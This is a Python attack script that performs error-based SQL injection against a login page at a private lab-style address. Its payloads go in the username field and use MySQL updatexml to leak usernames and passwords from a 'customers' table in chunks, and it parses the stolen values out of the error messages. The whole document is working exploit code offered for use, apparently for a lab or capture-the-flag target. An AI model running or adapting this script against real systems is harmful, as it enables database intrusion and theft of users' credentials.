import requests
import re

TARGET_URL = "http://172.17.0.2/login.php"

session = requests.Session()

HEADERS = {
    "User-Agent": "Chrome/136.0.0.0"
}

# This function builds a payload to extract a chunk of the password based on the row offset, starting position, and chunk length.
def build_chunk_payload(row_offset, start_pos, chunk_len):

    payload = (
        "admin' AND updatexml(1,"
        "concat(0x7e,"
        f"(SELECT MID(password,{start_pos},{chunk_len}) "
        f"FROM customers LIMIT {row_offset},1),"
        "0x7e),1)-- -"
    )

    return payload

# This function builds a payload to extract the username based on the row offset.
def build_payload(offset):
    return (
        "admin' AND updatexml(1,"
        "concat(0x7e,"
        f"(SELECT username FROM customers LIMIT {offset},1),"
        "0x7e),1)-- -"
    )

# This function sends the payload to the target URL and returns the response text.
def send_payload(payload):

    data = {
        "username": payload,
        "password": "test"
    }

    response = session.post(
        TARGET_URL,
        data=data,
        headers=HEADERS,
        timeout=10
    )

    return response.text

# This function extracts the result from the HTML response using a regular expression to find the value between tildes (~).
def extract_result(html):

    match = re.search(r"~(.*?)~", html)

    if match:
        return match.group(1)

    return None


def main():

    print("[+] Starting extraction")

    for row_offset in range(5):
        combined_result = []

        for start_pos in (1, 11, 21, 31):
            payload = build_chunk_payload(row_offset, start_pos, 10)

            try:
                html = send_payload(payload)
                result = extract_result(html)

                combined_result.append(result or "")
            except Exception:
                combined_result.append("")

        combined_value = "".join(combined_result)

        username_result = ""
        try:
            username_html = send_payload(build_payload(row_offset))
            username_result = extract_result(username_html) or ""
        except Exception:
            username_result = ""

        print(f"{combined_value} | {username_result}")

if __name__ == "__main__":
    main()